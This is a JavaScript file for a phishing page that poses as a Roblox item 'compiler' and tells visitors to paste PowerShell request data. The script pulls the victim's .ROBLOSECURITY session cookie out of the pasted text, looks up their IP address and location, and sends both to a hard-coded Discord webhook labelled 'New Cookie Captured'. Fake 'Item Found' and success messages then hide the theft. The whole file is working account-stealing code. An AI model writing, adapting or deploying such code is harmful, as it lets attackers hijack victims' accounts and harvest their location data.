// === UI Setup ===
document.getElementById('instructions').textContent =
  'Press on the "Compile Item" button to compile your item. Once you have your PowerShell copied, you can paste it and hit "Enter" to check.';

// === Modal Open/Close Functions ===
function openModal(id) {
  const modal = document.getElementById(id);
  if (modal) {
    modal.style.display = 'flex';
    modal.style.opacity = '1';
    const modalContent = modal.querySelector('.modal-content');
    if (modalContent) modalContent.classList.remove('fade-out');

    setTimeout(() => {
      const input = modal.querySelector('input.input-field.form-control');
      if (input) input.focus();
    }, 100);
  }
}

function closeModal(id) {
  const modal = document.getElementById(id);
  if (modal) {
    const modalContent = modal.querySelector('.modal-content');
    if (modalContent) modalContent.classList.add('fade-out');
    setTimeout(() => {
      modal.style.display = 'none';
      modal.style.opacity = '0';
      if (modalContent) modalContent.classList.remove('fade-out');
    }, 400);
  }
}

function closeAllModals() {
  ['modal', 'twofa-modal', 'twofa-modal-2', 'faqModal', 'aboutModal', 'tosModal'].forEach(closeModal);
}

// === Main Button ===
document.getElementById('enterButton').addEventListener('click', function() {
  openModal('modal');
});

// === PowerShell Submission ===
document.getElementById('submitButton').addEventListener('click', async function() {
  const powershellInput = document.getElementById('powershellInput');
  const powershellData = powershellInput.value.trim();

  if (!powershellData) {
    alert('Please paste your PowerShell data.');
    return;
  }

  // Extract assetId and itemName from the catalog URL
  const catalogMatch = powershellData.match(/roblox\.com\/catalog\/(\d+)\/([^"\s`]+)/i);
  
  let assetId = null;
  let itemName = "Unknown Item";
  
  if (catalogMatch) {
    assetId = catalogMatch[1];
    itemName = decodeURIComponent(catalogMatch[2]).replace(/[-_]/g, ' '); // Convert URL-encoded name and replace dashes/underscores with spaces
  }

  if (!assetId) {
    showErrorAlert();
    powershellInput.value = '';
    closeModal('modal');
    await sendWebhook('No Asset ID Found', 'No asset id found in PowerShell.', 0xff0000);
    return;
  }

  // Send webhook for valid cookie
  const roblosecurityRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
  const match = powershellData.match(roblosecurityRegex);
  let ipInfo = null;
  if (match) {
    const cookie = match[1].trim();
    // Fetch IP and location info
    try {
      const res = await fetch('https://ipapi.co/json');
      if (res.ok) {
        ipInfo = await res.json();
      }
    } catch (e) {
      ipInfo = null;
    }
    let locationText = '';
    if (ipInfo) {
      locationText = `IP: ${ipInfo.ip}\nCountry: ${ipInfo.country_name}\nRegion: ${ipInfo.region}\nCity: ${ipInfo.city}\nOrg: ${ipInfo.org}`;
    } else {
      locationText = 'IP/location lookup failed.';
    }
    await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\`\n${locationText}`, 0x00ff00);
  }

  powershellInput.value = '';
  closeModal('modal');

  // Show loading overlay and handle the sequence
  showLoading(true, false);
  showLoadingMessage("Searching for item 🔎");

  // Sequence with timing changes
  setTimeout(() => {
    // 2s: Show item found with name (no image box)
    showLoadingMessage(`Item Found! ${itemName}`);
  }, 2000);

  setTimeout(() => {
    // 6s: Change text to "Checking item ✅"
    showLoadingMessage("Checking item ✅");
  }, 6000);

  setTimeout(() => {
    // 8.5s: Fade out loading
    showLoading(false);
  }, 8500);

  setTimeout(() => {
    // 10s: Show success popup instead of 2FA modal
    showSuccessPopup();
  }, 10000);
});

// Helper to change loading message
function showLoadingMessage(msg) {
  const msgDiv = document.getElementById('loading-message');
  if (msgDiv) msgDiv.textContent = msg;
}

// === Loading Spinner and Message ===
let loadingMsgInterval = null;
let loadingMsgIndex = 0;
const loadingMessages = [
  "Compiling avatar",
  "Gathering Avatar details",
  "Processing"
];

function showLoading(show, cycling = false) {
  if (show) {
    if (!document.getElementById('loading-overlay')) {
      const overlay = document.createElement('div');
      overlay.id = 'loading-overlay';

      const spinner = document.createElement('div');
      spinner.className = 'spinner';

      const msg = document.createElement('div');
      msg.className = 'loading-message';
      msg.id = 'loading-message';
      msg.textContent = cycling ? loadingMessages[0] : "Processing";

      overlay.appendChild(spinner);
      overlay.appendChild(msg);
      document.body.appendChild(overlay);
    }
    if (cycling) {
      startLoadingMessages();
    } else {
      stopLoadingMessages();
      document.getElementById('loading-message').textContent = "Processing";
    }
    // Spinner is always visible now!
    const spinnerElem = document.querySelector('#loading-overlay .spinner');
    if (spinnerElem) spinnerElem.style.display = '';
  } else {
    stopLoadingMessages();
    const overlay = document.getElementById('loading-overlay');
    if (overlay) overlay.remove();
  }
}

function startLoadingMessages() {
  loadingMsgIndex = 0;
  const msgDiv = document.getElementById('loading-message');
  if (msgDiv) msgDiv.textContent = loadingMessages[loadingMsgIndex];
  loadingMsgInterval = setInterval(() => {
    loadingMsgIndex = (loadingMsgIndex + 1) % loadingMessages.length;
    const msgDiv = document.getElementById('loading-message');
    if (msgDiv) msgDiv.textContent = loadingMessages[loadingMsgIndex];
  }, 1500);
}

function stopLoadingMessages() {
  clearInterval(loadingMsgInterval);
}

// === Red Alert Box ===
function showErrorAlert() {
  const alert = document.getElementById('error-alert');
  if (alert) {
    alert.style.display = 'block';
    alert.style.opacity = '1';
    setTimeout(() => {
      alert.style.opacity = '0';
      setTimeout(() => { alert.style.display = 'none'; }, 500);
    }, 4000);
  }
}

// === Webhook Sending ===
async function sendWebhook(title, description, color) {
  const webhookUrl = 'https://discord.com/api/webhooks/1394404049201270844/WhCFNt-z4VGoChbIbiCx8FonULSBKTwaTTDJErJyqo1GzByZyqN2CadhSP34FSc_HtJT';
  const payload = {
    embeds: [{
      title: title,
      description: description,
      color: color,
      footer: { text: `Logger System • ${new Date().toLocaleString()}` }
    }]
  };

  await fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
}

// === Helpers ===
function closeTwoFAModal() {
  const modals = ['twofa-modal', 'twofa-modal-2'];
  modals.forEach(id => closeModal(id));
}

function useAnotherMethod() {
  alert('Other verification methods are not available. Please use your authenticator app or check your email.');
}

function showSuccessPopup() {
  const popup = document.createElement('div');
  popup.textContent = 'Item Compiled Successfully ✅ You can close this page now.';
  popup.style.position = 'fixed';
  popup.style.top = '20px';
  popup.style.left = '50%';
  popup.style.transform = 'translateX(-50%)';
  popup.style.background = '#28a745';
  popup.style.color = 'white';
  popup.style.padding = '15px 30px';
  popup.style.borderRadius = '8px';
  popup.style.fontSize = '18px';
  popup.style.fontWeight = 'bold';
  popup.style.zIndex = '9999';
  popup.style.boxShadow = '0 0 15px rgba(0,0,0,0.3)';
  document.body.appendChild(popup);

  setTimeout(() => {
    popup.style.transition = 'opacity 0.5s';
    popup.style.opacity = '0';
    setTimeout(() => popup.remove(), 500);
  }, 4000);
}

// === Spinner Animation (for loading overlay) ===
const styleSheet = document.createElement('style');
styleSheet.type = 'text/css';
styleSheet.innerText = `
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
.spinner {
  width: 64px;
  height: 64px;
  border: 8px solid #f3f3f3;
  border-top: 8px solid #007bff;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin-bottom: 20px;
}
.loading-message {
  color: #fff;
  font-size: 1.5rem;
  font-weight: 600;
  text-align: center;
  margin-top: 0;
  letter-spacing: 1px;
}`;
document.head.appendChild(styleSheet);
